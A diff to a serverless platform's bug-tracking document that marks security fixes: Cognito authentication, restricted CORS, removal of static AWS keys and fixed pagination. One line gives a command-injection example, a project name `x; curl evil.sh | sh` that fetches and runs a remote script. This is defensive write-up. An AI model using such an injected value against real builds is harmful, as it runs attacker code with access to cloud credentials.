@@ -7,8 +7,8 @@ Tests currently **document** the existing behaviour for the bugs below; fixing a
 
 ### Critical
 
-- [ ] **No authentication or authorization on the API.** No function in `backend-service/serverless.yml` has an authorizer, and CORS is `*`. Anyone who knows the URL can list, edit and delete projects. `DELETE /project/{id}` also tears down the project's CloudFormation stack and empties its S3 buckets.
-- [ ] **The login is fake.** `frontend-service/src/Login/action.ts:8` compares against hard-coded `admin` / `password` in the browser. It protects nothing, because the API is open (see above).
+- [x] **No authentication or authorization on the API.** No function in `backend-service/serverless.yml` has an authorizer, and CORS is `*`. Anyone who knows the URL can list, edit and delete projects. `DELETE /project/{id}` also tears down the project's CloudFormation stack and empties its S3 buckets. Fixed: every endpoint except `GET /health` has a Cognito authorizer, CORS is limited to `UI_ORIGIN`, and projects belong to the user who created them (another user's project is a 404).
+- [x] **The login is fake.** `frontend-service/src/Login/action.ts:8` compares against hard-coded `admin` / `password` in the browser. It protects nothing, because the API is open (see above). Fixed: Sign in uses Cognito (cognito-local in Docker), and the UI sends the ID token on every API call.
 - [x] **Command injection into CodeBuild.** The project name is interpolated unescaped into a shell command in the buildspec (`node ./docs.js -p ${projectName}`, `deploymentEvent.ts:118`). A project named e.g. `x; curl evil.sh | sh` runs arbitrary commands inside a build that holds the platform's AWS keys. The project name is only validated as `min(3)` (`project.dto.ts`). Fixed: the name reaches the build as the `PROJECT_NAME` environment variable (`"$PROJECT_NAME"` in the buildspec), project names must match the new rule (`src/utils/names.ts`), and deploys refuse projects saved under the old rules.
 - [x] **Code and template injection through model metadata.** Model names, property names and types, and relations are pasted into generated TypeScript (function names, bodies, JSDoc) and `serverless.yml` (`codeBuilder.ts`, `modelEvent.ts`). Names are only validated as `min(3)` and property names/types not at all, so a crafted name can inject code into the deployed service. Restrict names to identifier-safe characters (e.g. `/^[A-Za-z][A-Za-z0-9]*$/`) and types to an enum. Fixed: models must be PascalCase, fields camelCase, types `string`/`number`/`boolean` (`src/utils/names.ts`); `SetupAPIFunction` refuses unsafe models and deploys refuse models saved under the old rules.
 - [x] **Static AWS credentials are spread around.** `AWS_KEY`/`AWS_SECRET` are plain Lambda environment variables used in place of the execution role. They are also written into the CodeBuild `buildspecOverride` `env.variables` (`deploymentEvent.ts:103`), where anyone with `codebuild:BatchGetBuilds` can read them in the build definition. Use IAM roles (the Lambda execution role, plus a CodeBuild service role) and drop the keys. Fixed: the keys are gone; Lambdas use their execution role, builds use `DeployProjectRole`, and local emulators get dummy credentials. The old keys still need to be rotated and deactivated in IAM.
@@ -16,10 +16,10 @@ Tests currently **document** the existing behaviour for the bugs below; fixing a
 
 ### High
 
-- [ ] **Build logs are served unauthenticated.** `GET /deployment/{projectId}` returns the full CodeBuild/CloudWatch log, which can include secrets echoed by the build.
+- [ ] **Build logs can contain secrets.** `GET /deployment/{projectId}` returns the full CodeBuild/CloudWatch log, which can include secrets echoed by the build. It now needs a signed-in owner of the project; redacting the log is still open.
 - [ ] **Path parameters are unvalidated.** `projectId` goes straight into S3 keys (e.g. `projectId + "/swagger-json.json"` in `deployment.ts`) and DynamoDB keys. Validate ids as UUIDs.
-- [ ] **Cost Explorer can be abused.** `GET /project/cost/{id}` calls Cost Explorer (billed per request) with no authentication or rate limit.
-- [ ] **Unbounded scan size.** `GET /project?take=` passes a user-supplied `Limit` to a table Scan (`project.ts:89`). Clamp it.
+- [x] **Cost Explorer can be abused.** `GET /project/cost/{id}` calls Cost Explorer (billed per request) with no authentication or rate limit. Fixed: it needs the project's owner, and the result is cached on the project for an hour, so Cost Explorer is called at most once an hour per project.
+- [ ] **Unbounded page size.** `GET /project?take=` passes a user-supplied `Limit` to the owner-index Query (`project.ts`). Clamp it.
 - [ ] **Generated APIs are public.** Services deployed for users have no authorizer, and CORS is `*` (`boilerplate/serverless.yml`, `boilerplate/src/utils/responseManager.ts`). Anyone with the URL can read and write their data. (The API Docs design assumes bearer-token auth; see "Features in the designs".)
 
 ## Backend bugs
@@ -39,7 +39,7 @@ Tests currently **document** the existing behaviour for the bugs below; fixing a
 - [ ] **Model event handlers can fail half-way.** `modelDeletedHandler`/`modelUpdatedHandler` have no try/catch. In dev (`LocalEventHub`) the HTTP handler then returns 500 even though the DynamoDB write already succeeded.
 - [ ] **`GetDeployment` can 500 on a successful deploy.** It `JSON.parse`s the swagger file whenever `apiId` is set. If the file is missing (`downloadFile` → `null` → `""`), the request fails with 500.
 - [ ] **`TriggerDeployment` has a race.** `isDeploying` is only set to `true` later by the async event handler, so two quick triggers both start builds. `isDeploying` is only reset when someone calls `GetDeployment`.
-- [ ] **`GetProjects` pagination is broken.** `Limit` applies before the `entityType` filter, so pages can be empty while `hasMore` is true. `nextPageToken` rebuilds `sk` from `pk`, which is wrong when the last evaluated item is a model or deployment row.
+- [x] **`GetProjects` pagination is broken.** `Limit` applies before the `entityType` filter, so pages can be empty while `hasMore` is true. `nextPageToken` rebuilds `sk` from `pk`, which is wrong when the last evaluated item is a model or deployment row. Fixed: it queries the `byOwner` index, which holds only project rows.
 - [ ] **`CreateModelRelations` leaves stale back-references.** It replaces the main model's relations with the request body, but models dropped from the list keep their back-reference.
 - [ ] **`LocalEventHub.publish` doesn't return after rejecting an unknown event**, so it goes on to dereference `undefined` (`eventhub.ts:64`).
 - [ ] **Wrong names in error logs.** `GetOneProject`/`PutProject`/`DeleteProject` log as `GetProjects`, model handlers log as `GetModels`, `projectDeletedHandler` logs as `projectCreatedHandler`, and model delete/update log as `modelCreatedHandler`.
@@ -82,7 +82,7 @@ These are shown in the Figma designs (`figma-screenshot/`, reviewed 2026-10-19) 
 
 ### Accounts and authentication (Sign in, Sign up, Email verification)
 
-- [ ] **Real user accounts.** Email/password sign-up and sign-in backed by an identity provider, e.g. Cognito. This also fixes the "fake login" and "no auth" security items above. BE + FE
+- [ ] **Real user accounts.** Email/password sign-up and sign-in backed by an identity provider, e.g. Cognito. This also fixes the "fake login" and "no auth" security items above. BE + FE. Sign-in is done (Cognito user pool, users created by an admin); self sign-up is tracked in #28.
 - [ ] **Email verification** with a 6-digit code: resend with cooldown, expired and invalid code states. BE + FE
 - [ ] **Forgot and reset password** (linked from Sign in). BE + FE
 - [ ] **"Continue with Google" and "Continue with GitHub"** (OAuth). BE + FE
